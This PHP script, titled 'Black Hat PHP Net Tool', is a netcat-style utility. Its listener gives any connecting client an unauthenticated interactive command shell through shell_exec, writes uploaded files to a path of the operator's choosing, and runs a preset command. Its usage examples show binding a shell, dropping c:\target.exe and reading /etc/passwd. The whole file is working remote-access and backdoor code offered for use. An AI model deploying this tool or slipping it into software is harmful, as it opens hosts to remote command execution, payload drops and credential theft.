<?php

# define some global variables
$listen             = false;
$command            = false;
$upload             = false;
$execute            = "";
$target             = "";
$upload_destination = "";
$port               = 0;

function usage()
{
    echo "Black Hat PHP Net Tool\n\n";

    echo "Usage: netcat.php -t target_host -p port \n";
    echo "-l --listen               - listen on [host]:[port] for incoming connections\n";
    echo "-e --execute=file_to_run  - execute the given file upon receiving a connection\n";
    echo "-c --command              - initialize a command shell\n\n";

    echo "Examples: \n";
    echo "netcat.php -t 192.168.0.1 -p 5555 -l -c\n";
    echo "netcat.php -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe\n";
    echo "netcat.php -t 192.168.0.1 -p 5555 -l -e=\"cat /etc/passwd\"\n";
    echo "echo 'ABCDEF' | ./netcat.php -t 192.168.11.12 -p 135\n";
    die;
}

function client_handler($client_socket)
{
    global $upload, $execute, $command, $upload_destination ;

    if (strlen($upload_destination)) {
        echo "1";
        $file_buffer = "";

        while (1) {
            socket_recv($client_socket, $data, 4096, MSG_DONTWAIT);

            if (!$data) {
                break;
            } else {
                $file_buffer .= $data;
            }
        }

        try {
            $file_descriptor = fopen($upload_destination, "wb");
            fwrite($file_descriptor, $file_buffer);
            fclose($file_descriptor);

            $success_msg = "Successfully saved file to " . $upload_destination . "\r\n";
            socket_write($client_socket, $success_msg, strlen($success_msg));
        } catch (Exception $e) {
            $fail_msg = "Failed to save file to " . $upload_destination . "\r\n";
            socket_write($client_socket, $fail_msg, strlen($fail_msg));
        }
    }

    if (strlen($execute)) {
        echo "2";
        $output = run_command($execute);
        socket_write($client_socket, $output, strlen($output));
    }

    if (strlen($command)) {
        echo "3";
        while (1) {
            $test = socket_write($client_socket, "<PHPNETCAT:#> ", strlen("<PHPNETCAT:#>"));
            
            $cmd_buffer = "";
            while (!strstr($cmd_buffer, "\n")) {
                $client_data = socket_read($client_socket, 4096);
                $cmd_buffer .= $client_data;
            }
            $response = run_command($cmd_buffer);
    
            socket_write($client_socket, $response, strlen($response));
        }
    }
}

function run_command($command)
{
    $command = rtrim($command, "\n");
    $output = "";

    if (strlen($command)) {
        $output = shell_exec($command);
    }

    if ($output === null) {
        $output = "Failed to execute command. \r\n";
    }
    

    return $output;
}

function server_loop()
{
    global $target, $port;

    if (!strlen($target)) {
        $target = "0.0.0.0";
    }

    $server = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    socket_bind($server, $target, $port);

    socket_listen($server, 5);

    while (1) {
        $client_socket = socket_accept($server);
        socket_getpeername($client_socket, $client_address, $client_port);
        client_handler($client_socket);
    }
}

function client_sender($buffer)
{
    global $target, $port;
    try {
        $client = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
        socket_connect($client, $target, $port);

        if (isset($buffer)) {
            socket_write($client, $buffer);
            while (1) {
                $recv_len = 1;
                $response = "";

                while ($recv_len) {
                    $data = socket_read($client, 4096);
                    $recv_len = strlen($data);
                    $response .= $data;
                    
                    if ($recv_len<4096) {
                        break;
                    }
                }


                echo $response;

                $buffer = fgets(STDIN);
                $buffer .= "\n";

                socket_write($client, $buffer);
                #fflush($client);
            }
        }
    } catch (Exception $e) {
        echo "[*] Exception! Exiting.\n";
        socket_close($client);
    }
}

function main()
{
    global $argc, $argv, $listen, $command , $upload , $execute, $target, $upload_destination, $port;

    if (count($argv)==1) {
        usage();
    }


    $options = getopt("hle:t:p:cu:", ["help", "listen", "execute", "target", "port", "command", "upload"]);

    if (!is_array($options)) {
        print "There was a problem reading in the options.\n\n";
        usage();
    }

    foreach ($options as $option => $arg) {
        if (in_array($option, ["h", "help"])) {
            usage();
        } elseif (in_array($option, ["l", "listen"])) {
            $listen = true;
        } elseif (in_array($option, ["e", "execute"])) {
            $execute = $arg;
        } elseif (in_array($option, ["c", "command"])) {
            $command = true;
        } elseif (in_array($option, ["u", "upload"])) {
            $upload_destination = $arg;
        } elseif (in_array($option, ["t", "target"])) {
            $target = $arg;
        } elseif (in_array($option, ["p", "port"])) {
            $port = (int)$arg;
        } else {
            usage();
        }
    }

    if (!$listen && strlen($target) && $port>0) {
        $buffer = file_get_contents("php://stdin");
        client_sender($buffer);
    }

    if ($listen) {
        server_loop();
    }
}

main();
